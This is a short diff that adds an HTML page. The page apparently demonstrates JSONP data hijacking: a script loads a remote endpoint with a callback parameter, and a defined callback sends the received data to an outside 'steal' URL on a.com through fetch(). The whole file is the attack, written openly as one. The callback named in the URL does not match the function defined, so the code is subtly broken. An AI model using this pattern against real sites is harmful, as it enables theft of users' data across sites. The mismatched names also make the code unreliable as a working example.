@@ -1,0 +1,11 @@
+<html>
+<body>
+    <script>
+        function mCallback(data) {
+            // 여기서 데이터 전송
+            fetch('https://a.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
+        }
+    </script>
+    <script src="https://example.com/data?callback=maliciousCallback"></script>
+</body>
+</html>
